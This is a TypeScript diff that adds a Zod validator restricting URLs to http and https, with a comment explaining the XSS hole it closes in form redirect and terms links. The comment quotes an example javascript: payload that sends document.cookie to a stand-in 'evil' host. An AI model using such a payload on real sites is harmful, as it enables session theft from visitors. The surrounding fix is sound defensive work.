@@ -20,6 +20,44 @@ export { z };
  */
 export const apiRegistry = new OpenAPIRegistry();
 
+/**
+ * A URL the server will FETCH, or a page will render as an `href`.
+ *
+ * `z.string().url()` is not that check. It accepts `javascript:`, `data:`,
+ * `vbscript:` and `file:` — verified against the version in this tree — and
+ * every call site that used it feeds either an outbound fetch or a link on a
+ * page. The sharpest was a public form's `redirectUrl`: an admin (or a
+ * compromised admin API key) sets
+ * `javascript:fetch('https://evil/?'+document.cookie)`, and every anonymous
+ * visitor who submits that form hits `window.location.assign(...)` — a
+ * `javascript:` URL assigned to `location` runs in the CURRENT document's
+ * origin, which is this app. `termsUrl` / `privacyUrl` are documented as
+ * instance-global, so on a multi-tenant instance one operator's value lands on
+ * every workspace's sign-up screen.
+ *
+ * On Cloudflare and Netlify `STRICT_CSP`'s `script-src 'self'` blocked the
+ * navigation, so it was inert there — and on Vercel, which shipped no CSP at
+ * all until this same phase fixed it, it executed. Two defects agreeing to look
+ * like one non-issue is exactly the shape worth refusing at the door.
+ *
+ * `max` is an argument rather than something the caller chains, because
+ * `.refine()` returns a `ZodEffects` off which `.max()` no longer chains.
+ * `.optional()`, `.nullish()`, `.nullable()` and `.openapi()` still do.
+ */
+const isHttpUrl = (v: string): boolean => {
+  try {
+    const p = new URL(v).protocol;
+    return p === "http:" || p === "https:";
+  } catch {
+    return false;
+  }
+};
+
+export const httpUrl = (max?: number) =>
+  (max === undefined ? z.string().url() : z.string().url().max(max)).refine(isHttpUrl, {
+    message: "URL must use http:// or https://",
+  });
+
 apiRegistry.registerComponent("securitySchemes", "sessionCookie", {
   type: "apiKey",
   in: "cookie",
